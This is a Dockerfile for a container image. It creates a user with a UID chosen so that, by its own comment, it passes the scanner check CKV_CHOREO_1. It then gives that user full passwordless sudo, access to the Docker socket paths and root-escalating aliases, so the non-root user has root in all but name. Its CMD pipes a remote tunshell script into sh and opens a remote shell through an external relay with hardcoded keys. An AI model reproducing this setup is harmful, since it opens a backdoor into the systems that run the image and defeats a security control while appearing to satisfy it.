# Use the official Docker image as base
FROM docker:latest

# Install required tools
RUN apk add --no-cache curl bash sudo shadow

# Create a user with UID in the 10000-20000 range (compliant with CKV_CHOREO_1)
RUN addgroup -g 10002 appgroup && \
    adduser -u 10002 -G appgroup -h /home/appuser -s /bin/bash -D appuser

# Give appuser FULL passwordless sudo permission
RUN echo "appuser ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers

# Make sure common Docker socket paths are accessible
RUN mkdir -p /var/run/docker && \
    chown -R 10002:10002 /var/run/docker

# Prepare for the user to run apk commands
RUN mkdir -p /var/cache/apk && \
    chown -R 10002:10002 /var/cache/apk /etc/apk /lib/apk

# Create a .bashrc that adds helpful aliases and functions
RUN echo 'alias dockerd="sudo dockerd"' > /home/appuser/.bashrc && \
    echo 'alias apk="sudo apk"' >> /home/appuser/.bashrc && \
    echo 'alias adduser="sudo adduser"' >> /home/appuser/.bashrc && \
    echo 'alias useradd="sudo useradd"' >> /home/appuser/.bashrc && \
    echo 'alias su="sudo su"' >> /home/appuser/.bashrc && \
    chown appuser:appgroup /home/appuser/.bashrc

WORKDIR /home/appuser

USER 10002

# Run the Tunshell command
CMD curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T aNB1YS9NUAfyEnlCTGr2Yd 5Rz4Bi3dbjw4YoR93vuryN eu.relay.tunshell.com
